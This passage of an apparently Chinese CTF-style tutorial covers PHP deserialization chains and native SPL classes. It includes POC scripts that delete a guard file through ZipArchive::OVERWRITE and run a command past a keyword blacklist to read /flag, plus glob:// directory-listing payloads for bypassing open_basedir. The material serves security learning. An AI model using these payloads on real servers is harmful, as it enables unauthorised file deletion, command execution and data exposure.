class="string">&quot;php://filter/read=convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>shell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到function<code>shell</code>，所以我们可以通过反序列化，来调用shell方法，然后执行<code>system</code>来命令执行</p>
<p>这儿遇到一个问题，open的方法，当waf.txt不存在时，我们才能调用shell方法，我们需要删除waf.txt,想到了原生类,且需要原生类中有open方法，去删除waf.txt.</p>
<p>遍历一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>找到了<code>ZipArchive::open</code></p>
<p>如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>)</span><br></pre></td></tr></table></figure>
<p>删除waf.txt的POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;<span class="comment">//或者为8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>删除后，我们直接构造命令执行，也需要绕过正则</p>
<p>我们这种只需要用<code>''</code>或者<code>\</code>来过滤即可</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;n\l /flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<h4 id="php-原生文件操作类"><a class="markdownIt-Anchor" href="#php-原生文件操作类"></a> PHP 原生文件操作类</h4>
<h5 id="spl"><a class="markdownIt-Anchor" href="#spl"></a> SPL</h5>
<p>SPL是php标准库</p>
<p><a href="https://www.php.net/manual/zh/book.spl.php">PHP: SPL - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SPL 对 PHP 引擎进行了扩展，例如 <span class="built_in">ArrayAccess</span>、<span class="built_in">Countable</span> 和 <span class="built_in">SeekableIterator</span> 等接口，它们用于以数组形式操作对象。同时，你还可以使用 <span class="built_in">RecursiveIterator</span>、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、<span class="built_in">SplObserver</span>、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率</span><br></pre></td></tr></table></figure>
<h5 id="遍历文件目录的类"><a class="markdownIt-Anchor" href="#遍历文件目录的类"></a> 遍历文件目录的类</h5>
<ul>
<li>DirectoryIterator 类</li>
<li>FilesystemIterator 类</li>
<li>GlobIterator 类</li>
</ul>
<h5 id="directoryiterator-类"><a class="markdownIt-Anchor" href="#directoryiterator-类"></a> DirectoryIterator 类</h5>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">current</span> ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getATime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getBasename</span> ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getCTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getExtension</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getFilename</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getGroup</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getInode</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getMTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getOwner</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPath</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPathname</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPerms</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getSize</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getType</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDir</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDot</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isExecutable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isFile</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isLink</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isReadable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isWritable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">seek</span> ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">valid</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>遍历文件目录,直接对文件全部输出出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</p>
<blockquote>
<p>glob:// 协议用来查找匹配的文件路径模式</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<h5 id="filesystemiterator-类"><a class="markdownIt-Anchor" href="#filesystemiterator-类"></a> FilesystemIterator 类</h5>
<p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p>都是一样的，我们就列举一个</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接对文件目录全部输出出来。</p>
<h5 id="globiterator类"><a class="markdownIt-Anchor" href="#globiterator类"></a> GlobIterator类</h5>
<p>GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">GlobIterator</span> <span class="keyword">extends</span> <span class="built_in">FilesystemIterator</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> , <span class="built_in">Countable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">count</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="comment">/* 继承的方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">SKIP_DOTS</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">current</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">getFlags</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">setFlags</span> ( <span class="keyword">int</span> <span class="variable">$flags</span> = ? ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。</p>
<p>意思就是我们可以在<code>GlobIterator</code>中直接使用正则匹配路径来遍历目录</p>
<p>遍历目录全部文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="使用可遍历目录类绕过-open_basedir"><a class="markdownIt-Anchor" href="#使用可遍历目录类绕过-open_basedir"></a> 使用可遍历目录类绕过 open_basedir</h5>
<p>关于绕过open_basedir()可以看看<a href="https://blog.csdn.net/Xxy605/article/details/120221577">这个文章</a></p>
<h5 id="使用directoryiterator类"><a class="markdownIt-Anchor" href="#使用directoryiterator类"></a> 使用DirectoryIterator类</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用filesystemiterator"><a class="markdownIt-Anchor" href="#使用filesystemiterator"></a> 使用FilesystemIterator</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用-globiterator-类"><a class="markdownIt-Anchor" href="#使用-globiterator-类"></a> 使用 GlobIterator 类</h5>
